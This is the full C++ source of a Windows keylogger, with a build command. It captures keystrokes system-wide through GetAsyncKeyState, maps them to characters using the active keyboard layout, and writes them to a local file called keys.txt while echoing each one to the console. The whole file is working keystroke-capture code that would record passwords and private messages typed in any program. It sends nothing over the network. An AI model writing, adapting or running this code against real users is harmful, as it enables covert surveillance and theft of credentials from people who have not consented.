#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <iomanip>

// g++ keylogger.cpp -o keylogger.exe

// Function to get the actual character from keyboard layout
std::string getActualCharacter(int vkCode, bool shiftPressed) {
    // Get current keyboard layout
    HKL keyboardLayout = GetKeyboardLayout(0);
    
    // Create keyboard state array
    BYTE keyboardState[256] = {0};
    
    // Set shift state if needed
    if (shiftPressed) {
        keyboardState[VK_SHIFT] = 0x80;
    }
    
    // Set caps lock state
    if (GetKeyState(VK_CAPITAL) & 0x0001) {
        keyboardState[VK_CAPITAL] = 0x01;
    }
    
    // Convert virtual key to scan code
    UINT scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, keyboardLayout);
    
    // Get Unicode character
    wchar_t unicodeBuffer[3] = {0};
    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuffer, 2, 0, keyboardLayout);
    
    if (result > 0) {
        // Convert Unicode to UTF-8
        char utf8Buffer[8] = {0};
        int utf8Length = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, result, 
                                           utf8Buffer, sizeof(utf8Buffer) - 1, NULL, NULL);
        if (utf8Length > 0) {
            return std::string(utf8Buffer, utf8Length);
        }
    }
    
    return "";
}

// Function to get keyboard layout name
std::string getKeyboardLayoutName() {
    HKL layout = GetKeyboardLayout(0);
    LANGID langId = LOWORD(layout);
    
    char layoutName[256];
    if (GetLocaleInfoA(MAKELCID(langId, SORT_DEFAULT), LOCALE_SENGLANGUAGE, 
                      layoutName, sizeof(layoutName))) {
        return std::string(layoutName);
    }
    return "Unknown";
}

// Function to get the string representation of a key
std::string getKeyName(int key) {
    // Check if shift is currently pressed
    bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    
    // For printable keys, use the actual keyboard layout
    if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9') || 
        key == VK_OEM_1 || key == VK_OEM_2 || key == VK_OEM_3 || key == VK_OEM_4 ||
        key == VK_OEM_5 || key == VK_OEM_6 || key == VK_OEM_7 || key == VK_OEM_PLUS ||
        key == VK_OEM_COMMA || key == VK_OEM_MINUS || key == VK_OEM_PERIOD || key == VK_OEM_102) {
        
        std::string actualChar = getActualCharacter(key, shiftPressed);
        if (!actualChar.empty()) {
            return actualChar;
        }
    }
    
    // Handle special keys that don't have printable characters
    switch(key) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_RETURN: return "[ENTER]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_PAUSE: return "[PAUSE]";
        case VK_CAPITAL: return "[CAPS_LOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return " ";
        case VK_PRIOR: return "[PAGE_UP]";
        case VK_NEXT: return "[PAGE_DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[ARROW_LEFT]";
        case VK_UP: return "[ARROW_UP]";
        case VK_RIGHT: return "[ARROW_RIGHT]";
        case VK_DOWN: return "[ARROW_DOWN]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        // Numpad keys
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_MULTIPLY: return "*";
        case VK_ADD: return "+";
        case VK_SUBTRACT: return "-";
        case VK_DECIMAL: return ".";
        case VK_DIVIDE: return "/";
        default:
            // Try to get character using keyboard layout for any unmapped key
            std::string actualChar = getActualCharacter(key, shiftPressed);
            if (!actualChar.empty()) {
                return actualChar;
            }
            return "[UNKNOWN]";
    }
}

int main() {
    // Create or truncate the keys.txt file (start fresh)
    std::ofstream keylogFile("keys.txt", std::ios::trunc);
    if (!keylogFile.is_open()) {
        std::cout << "Error: Could not open keys.txt for writing" << std::endl;
        return 1;
    }
    
    // Set console to UTF-8 for proper Turkish character display
    SetConsoleOutputCP(CP_UTF8);
    
    // Display keyboard layout information
    std::string layoutName = getKeyboardLayoutName();
    std::cout << "Detected keyboard layout: " << layoutName << std::endl;
    
    keylogFile << "=== Keylogger Session Started ===" << std::endl;
    keylogFile << "Keyboard Layout: " << layoutName << std::endl;

    std::cout << "Keylogger started. Press CTRL+ESC to stop." << std::endl;
    
    bool keys[256] = {false}; // Track key states
    
    while (true) {
        Sleep(10); // Small delay to prevent high CPU usage
        
        // Check CTRL+ESC to exit (safer exit condition)
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
            break;
        }
        
        // Check all possible keys (focus on printable and common keys)
        for (int key = 8; key <= 255; key++) {
            // Skip modifier keys when used alone to avoid noise
            if (key == VK_LSHIFT || key == VK_RSHIFT || 
                key == VK_LCONTROL || key == VK_RCONTROL ||
                key == VK_LMENU || key == VK_RMENU) {
                continue;
            }
            
            // Skip some system keys that cause noise
            if (key == VK_LWIN || key == VK_RWIN || key == VK_APPS ||
                key == VK_SCROLL || key == VK_NUMLOCK) {
                continue;
            }
            
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!keys[key]) { // Key just pressed
                    keys[key] = true;
                    std::string keyName = getKeyName(key);
                    
                    // Only log meaningful keys
                    if (keyName != "[UNKNOWN]" && !keyName.empty()) {
                        keylogFile << keyName;
                        keylogFile.flush(); // Ensure immediate write
                        std::cout << "Key pressed: " << keyName << std::endl;
                    }
                }
            } else {
                keys[key] = false; // Key released
            }
        }
    }
    
    keylogFile << "=== Keylogger Session Ended ===" << std::endl;
    keylogFile.close();
    std::cout << "Keylogger stopped." << std::endl;
    return 0;
}

// Function to get a single key press (utility function)
int getKey(){
    for (int key = 8; key <= 255; key++) {
        if (GetAsyncKeyState(key) & 0x8000) {
            return key;
        }
    }
    return 0; // No key pressed
}